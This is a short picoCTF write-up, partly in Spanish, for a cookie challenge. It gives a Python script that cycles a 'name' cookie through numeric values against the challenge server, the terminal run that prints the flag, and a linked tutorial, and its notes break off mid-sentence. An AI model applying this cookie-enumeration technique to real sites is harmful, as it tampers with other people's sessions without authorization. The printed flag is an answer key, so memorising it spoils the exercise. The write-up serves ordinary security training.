Who doesn't love cookies? Try to figure out the best one.

## Solución
```
import requests
import re

url = "http://wily-courier.picoctf.net:50183/check"

for i in range(21):
    cookies = {'name': '{}'.format(i)}
    r = requests.get(url, cookies=cookies)

    if 'picoCTF{' in r.text:
        flag = re.findall(r'picoCTF\{.*\}', r.text)[0]
        print(flag)
```
┌──(venv)(dastruker㉿MSI)-[/mnt/c/Users/adomi]
└─$ python exp.py
picoCTF{3v3ry1_l0v3s_c00k135_a4dadb49}
## Notas Adicionales
Hice un exploit que utiliza la libreria de requests para acceder a las cookies de un http en este caso, la 

## Referencias
https://www.youtube.com/watch?v=LseQ-XWCXVo&list=PLDo9DMLZyP6kTZ8Td37-LdbAx4-yNfHBl&index=12